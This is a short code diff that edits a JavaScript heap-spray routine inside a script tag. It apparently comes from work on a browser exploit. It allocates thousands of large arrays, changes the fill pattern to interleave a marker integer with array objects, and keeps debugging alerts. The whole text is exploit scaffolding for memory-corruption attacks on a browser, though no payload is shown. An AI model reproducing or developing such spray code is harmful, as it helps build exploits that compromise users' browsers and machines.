@@ -1,16 +1,19 @@
 <script>	
-alert("start with uint8 value:0xA7A");
+alert("start with uint8 value:0xA8A");
         //var s_size = 0x10000;
+        var v1 = [1,2,3]
+        var v2 = 0x666
     var cnt = 0x1e00//(s_size-0x14)/8;
     //alert(1)
     var spray = new Array(0x800);
     alert(2)
     for (var i=0; i<0x800; i++) {
         spray[i] = new Array(cnt);
-        spray[i][0] = 0x666
-        spray[i][cnt-1] = 0x666
-        for (var j=0; j<cnt; j++) {
-            spray[i][j] = 0x666
+        spray[i][0] = v2
+        spray[i][cnt-1] = v2
+        for (var j=0; j<cnt; j+=2) {
+            spray[i][j] = v2
+            spray[i][j+1] = v1
         }
     }
     alert(333)
